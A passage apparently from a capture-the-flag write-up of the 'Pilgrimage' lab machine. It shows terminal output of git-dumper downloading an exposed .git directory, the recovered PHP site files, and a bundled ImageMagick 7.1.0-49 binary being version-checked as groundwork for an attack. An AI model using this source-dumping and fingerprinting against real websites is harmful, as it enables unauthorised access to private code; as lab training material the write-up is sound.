</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/hooks/prepare-commit-msg.sample <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/hooks/pre-receive.sample <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/index <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/hooks/update.sample <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/hooks/pre-push.sample <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/info/exclude <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/objects/info/packs <span style="color:#f92672">[</span>404<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> http://pilgrimage.htb/.git/objects/info/packs responded with status code <span style="color:#ae81ff">404</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Finding refs/
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/FETCH_HEAD <span style="color:#f92672">[</span>404<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> http://pilgrimage.htb/.git/FETCH_HEAD responded with status code <span style="color:#ae81ff">404</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/HEAD <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/config <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/info/refs <span style="color:#f92672">[</span>404<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> http://pilgrimage.htb/.git/info/refs responded with status code <span style="color:#ae81ff">404</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/ORIG_HEAD <span style="color:#f92672">[</span>404<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> http://pilgrimage.htb/.git/ORIG_HEAD responded with status code <span style="color:#ae81ff">404</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/logs/refs/heads/master <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/logs/HEAD <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/logs/refs/remotes/origin/HEAD <span style="color:#f92672">[</span>404<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> http://pilgrimage.htb/.git/logs/refs/remotes/origin/HEAD responded with status code <span style="color:#ae81ff">404</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/logs/refs/remotes/origin/master <span style="color:#f92672">[</span>404<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> http://pilgrimage.htb/.git/logs/refs/remotes/origin/master responded with status code <span style="color:#ae81ff">404</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/logs/refs/stash <span style="color:#f92672">[</span>404<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> http://pilgrimage.htb/.git/logs/refs/stash responded with status code <span style="color:#ae81ff">404</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/packed-refs <span style="color:#f92672">[</span>404<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> http://pilgrimage.htb/.git/packed-refs responded with status code <span style="color:#ae81ff">404</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/refs/heads/master <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/refs/remotes/origin/HEAD <span style="color:#f92672">[</span>404<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> http://pilgrimage.htb/.git/refs/remotes/origin/HEAD responded with status code <span style="color:#ae81ff">404</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/refs/remotes/origin/master <span style="color:#f92672">[</span>404<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> http://pilgrimage.htb/.git/refs/remotes/origin/master responded with status code <span style="color:#ae81ff">404</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/refs/stash <span style="color:#f92672">[</span>404<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> http://pilgrimage.htb/.git/refs/stash responded with status code <span style="color:#ae81ff">404</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/refs/wip/index/refs/heads/master <span style="color:#f92672">[</span>404<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> http://pilgrimage.htb/.git/refs/wip/index/refs/heads/master responded with status code <span style="color:#ae81ff">404</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/refs/wip/wtree/refs/heads/master <span style="color:#f92672">[</span>404<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> http://pilgrimage.htb/.git/refs/wip/wtree/refs/heads/master responded with status code <span style="color:#ae81ff">404</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Finding packs
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Finding objects
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching objects
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/objects/76/a559577d4f759fff6af1249b4a277f352822d5 <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/objects/b6/c438e8ba16336198c2e62fee337e126257b909 <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/objects/dc/446514835fe49994e27a1c2cf35c9e45916c71 <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/objects/1f/2ef7cfabc9cf1d117d7a88f3a63cadbb40cca3 <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/objects/c2/a4c2fd4e5b2374c6e212d1800097e3b30ff4e2 <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/objects/2f/9156e434cfa6204c9d48733ee5c0d86a8a4e23 <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/objects/00/00000000000000000000000000000000000000 <span style="color:#f92672">[</span>404<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> http://pilgrimage.htb/.git/objects/00/00000000000000000000000000000000000000 responded with status code <span style="color:#ae81ff">404</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/objects/1f/8ddab827030fbc81b7cb4441ec4c9809a48bc1 <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/objects/8a/62aac3b8e9105766f3873443758b7ddf18d838 <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/objects/c3/27c2362dd4f8eb980f6908c49f8ef014d19568 <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/objects/a5/29d883c76f026420aed8dbcbd4c245ed9a7c0b <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/objects/f2/b67ac629e09e9143d201e9e7ba6a83ee02d66e <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/objects/2b/95e3c61cd8f7f0b7887a8151207b204d576e14 <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/objects/54/4d28df79fe7e6757328f7ecddf37a9aac17322 <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/objects/e1/a40beebc7035212efdcb15476f9c994e3634a7 <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/objects/96/3349e4f7a7a35c8f97043c20190efbe20d159a <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/objects/b2/15e14bb4766deff4fb926e1aa080834935d348 <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/objects/e9/2c0655b5ac3ec2bfbdd015294ddcbe054fb783 <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/objects/5f/ec5e0946296a0f09badeb08571519918c3da77 <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/objects/46/44c40a1f15a1eed9a8455e6ac2a0be29b5bf9e <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/objects/cd/2774e97bfe313f2ec2b8dc8285ec90688c5adb <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/objects/c4/18930edec4da46019a1bac06ecb6ec6f7975bb <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/objects/06/19fc1c747e6278bbd51a30de28b3fcccbd848a <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/objects/c4/3565452792f19d2cf2340266dbecb82f2a0571 <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/objects/11/dbdd149e3a657bc59750b35e1136af861a579f <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/objects/6c/965df00a57fd13ad50b5bbe0ae1746cdf6403d <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/objects/ff/dbd328a3efc5dad2a97be47e64d341d696576c <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/objects/b4/21518638bfb4725d72cc0980d8dcaf6074abe7 <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/objects/fa/175a75d40a7be5c3c5dee79b36f626de328f2e <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/objects/88/16d69710c5d2ee58db84afa5691495878f4ee1 <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/objects/49/cd436cf92cc28645e5a8be4b1973683c95c537 <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/objects/fb/f9e44d80c149c822db0b575dbfdc4625744aa4 <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/objects/8e/42bc52e73caeaef5e58ae0d9844579f8e1ae18 <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/objects/29/4ee966c8b135ea3e299b7ca49c450e78870b59 <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/objects/f3/e708fd3c3689d0f437b2140e08997dbaff6212 <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/objects/50/210eb2a1620ef4c4104c16ee7fac16a2c83987 <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/objects/47/6364752c5fa7ad9aa10f471dc955aac3d3cf34 <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/objects/36/c734d44fe952682020fd9762ee9329af51848d <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/objects/93/ed6c0458c9a366473a6bcb919b1033f16e7a8d <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/objects/fd/90fe8e067b4e75012c097a088073dd1d3e75a4 <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/objects/9e/ace5d0e0c82bff5c93695ac485fe52348c855e <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/objects/26/8dbf75d02f0d622ac4ff9e402175eacbbaeddd <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/objects/8f/155a75593279c9723a1b15e5624a304a174af2 <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/objects/a7/3926e2965989a71725516555bcc1fe2c7d4f9e <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/objects/98/10e80fba2c826a142e241d0f65a07ee580eaad <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/objects/81/703757c43fe30d0f3c6157a1c20f0fea7331fc <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/objects/c2/cbe0c97b6f3117d4ab516b423542e5fe7757bc <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/objects/23/1150acdd01bbbef94dfb9da9f79476bfbb16fc <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/objects/ca/d9dfca08306027b234ddc2166c838de9301487 <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching http://pilgrimage.htb/.git/objects/f1/8fa9173e9f7c1b2f30f3d20c4a303e18d88548 <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Running git checkout .
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/git-dumper<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ cd Pilgrimage
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/git-dumper/Pilgrimage<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ ls -all 
</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">26972</span>
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">5</span> kali kali     <span style="color:#ae81ff">4096</span> Sep  <span style="color:#ae81ff">6</span> 09:51 .
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">4</span> kali kali     <span style="color:#ae81ff">4096</span> Sep  <span style="color:#ae81ff">6</span> 09:51 ..
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">6</span> kali kali     <span style="color:#ae81ff">4096</span> Sep  <span style="color:#ae81ff">6</span> 09:51 assets
</span></span><span style="display:flex;"><span>-rwxr-xr-x <span style="color:#ae81ff">1</span> kali kali     <span style="color:#ae81ff">5538</span> Sep  <span style="color:#ae81ff">6</span> 09:51 dashboard.php
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">7</span> kali kali     <span style="color:#ae81ff">4096</span> Sep  <span style="color:#ae81ff">6</span> 09:51 .git
</span></span><span style="display:flex;"><span>-rwxr-xr-x <span style="color:#ae81ff">1</span> kali kali     <span style="color:#ae81ff">9250</span> Sep  <span style="color:#ae81ff">6</span> 09:51 index.php
</span></span><span style="display:flex;"><span>-rwxr-xr-x <span style="color:#ae81ff">1</span> kali kali     <span style="color:#ae81ff">6822</span> Sep  <span style="color:#ae81ff">6</span> 09:51 login.php
</span></span><span style="display:flex;"><span>-rwxr-xr-x <span style="color:#ae81ff">1</span> kali kali       <span style="color:#ae81ff">98</span> Sep  <span style="color:#ae81ff">6</span> 09:51 logout.php
</span></span><span style="display:flex;"><span>-rwxr-xr-x <span style="color:#ae81ff">1</span> kali kali <span style="color:#ae81ff">27555008</span> Sep  <span style="color:#ae81ff">6</span> 09:51 magick
</span></span><span style="display:flex;"><span>-rwxr-xr-x <span style="color:#ae81ff">1</span> kali kali     <span style="color:#ae81ff">6836</span> Sep  <span style="color:#ae81ff">6</span> 09:51 register.php
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">4</span> kali kali     <span style="color:#ae81ff">4096</span> Sep  <span style="color:#ae81ff">6</span> 09:51 vendor
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/git-dumper/Pilgrimage<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ tree .
</span></span><span style="display:flex;"><span>.
</span></span><span style="display:flex;"><span>├── assets
</span></span><span style="display:flex;"><span>│   ├── bulletproof.php
</span></span><span style="display:flex;"><span>│   ├── css
</span></span><span style="display:flex;"><span>│   │   ├── animate.css
</span></span><span style="display:flex;"><span>│   │   ├── custom.css
</span></span><span style="display:flex;"><span>│   │   ├── flex-slider.css
</span></span><span style="display:flex;"><span>│   │   ├── fontawesome.css
</span></span><span style="display:flex;"><span>│   │   ├── owl.css
</span></span><span style="display:flex;"><span>│   │   └── templatemo-woox-travel.css
</span></span><span style="display:flex;"><span>│   ├── images
</span></span><span style="display:flex;"><span>│   │   ├── banner-04.jpg
</span></span><span style="display:flex;"><span>│   │   └── cta-bg.jpg
</span></span><span style="display:flex;"><span>│   ├── js
</span></span><span style="display:flex;"><span>│   │   ├── custom.js
</span></span><span style="display:flex;"><span>│   │   ├── isotope.js
</span></span><span style="display:flex;"><span>│   │   ├── isotope.min.js
</span></span><span style="display:flex;"><span>│   │   ├── owl-carousel.js
</span></span><span style="display:flex;"><span>│   │   ├── popup.js
</span></span><span style="display:flex;"><span>│   │   └── tabs.js
</span></span><span style="display:flex;"><span>│   └── webfonts
</span></span><span style="display:flex;"><span>│       ├── fa-brands-400.ttf
</span></span><span style="display:flex;"><span>│       ├── fa-brands-400.woff2
</span></span><span style="display:flex;"><span>│       ├── fa-regular-400.ttf
</span></span><span style="display:flex;"><span>│       ├── fa-regular-400.woff2
</span></span><span style="display:flex;"><span>│       ├── fa-solid-900.ttf
</span></span><span style="display:flex;"><span>│       ├── fa-solid-900.woff2
</span></span><span style="display:flex;"><span>│       ├── fa-v4compatibility.ttf
</span></span><span style="display:flex;"><span>│       └── fa-v4compatibility.woff2
</span></span><span style="display:flex;"><span>├── dashboard.php
</span></span><span style="display:flex;"><span>├── index.php
</span></span><span style="display:flex;"><span>├── login.php
</span></span><span style="display:flex;"><span>├── logout.php
</span></span><span style="display:flex;"><span>├── magick
</span></span><span style="display:flex;"><span>├── register.php
</span></span><span style="display:flex;"><span>└── vendor
</span></span><span style="display:flex;"><span>    ├── bootstrap
</span></span><span style="display:flex;"><span>    │   ├── css
</span></span><span style="display:flex;"><span>    │   │   └── bootstrap.min.css
</span></span><span style="display:flex;"><span>    │   └── js
</span></span><span style="display:flex;"><span>    │       └── bootstrap.min.js
</span></span><span style="display:flex;"><span>    └── jquery
</span></span><span style="display:flex;"><span>        ├── jquery.js
</span></span><span style="display:flex;"><span>        ├── jquery.min.js
</span></span><span style="display:flex;"><span>        ├── jquery.min.map
</span></span><span style="display:flex;"><span>        ├── jquery.slim.js
</span></span><span style="display:flex;"><span>        ├── jquery.slim.min.js
</span></span><span style="display:flex;"><span>        └── jquery.slim.min.map
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">11</span> directories, <span style="color:#ae81ff">37</span> files
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/git-dumper/Pilgrimage<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ ./magick         
</span></span><span style="display:flex;"><span>Error: Invalid argument or not enough arguments
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Usage: magick tool <span style="color:#f92672">[</span> <span style="color:#f92672">{</span>option<span style="color:#f92672">}</span> | <span style="color:#f92672">{</span>image<span style="color:#f92672">}</span> ... <span style="color:#f92672">]</span> <span style="color:#f92672">{</span>output_image<span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>Usage: magick <span style="color:#f92672">[</span> <span style="color:#f92672">{</span>option<span style="color:#f92672">}</span> | <span style="color:#f92672">{</span>image<span style="color:#f92672">}</span> ... <span style="color:#f92672">]</span> <span style="color:#f92672">{</span>output_image<span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>       magick <span style="color:#f92672">[</span> <span style="color:#f92672">{</span>option<span style="color:#f92672">}</span> | <span style="color:#f92672">{</span>image<span style="color:#f92672">}</span> ... <span style="color:#f92672">]</span> -script <span style="color:#f92672">{</span>filename<span style="color:#f92672">}</span> <span style="color:#f92672">[</span> <span style="color:#f92672">{</span>script_args<span style="color:#f92672">}</span> ...<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>       magick -help | -version | -usage | -list <span style="color:#f92672">{</span>option<span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/git-dumper/Pilgrimage<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ ./magick -version
</span></span><span style="display:flex;"><span>Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org
</span></span><span style="display:flex;"><span>Copyright: <span style="color:#f92672">(</span>C<span style="color:#f92672">)</span> <span style="color:#ae81ff">1999</span> ImageMagick Studio LLC
</span></span><span style="display:flex;"><span>License: https://imagemagick.org/script/license.php
</span></span><span style="display:flex;"><span>Features: Cipher DPC HDRI OpenMP<span style="color:#f92672">(</span>4.5<span style="color:#f92672">)</span> 
</span></span><span style="display:flex;"><span>Delegates <span style="color:#f92672">(</span>built-in<span style="color:#f92672">)</span>: bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
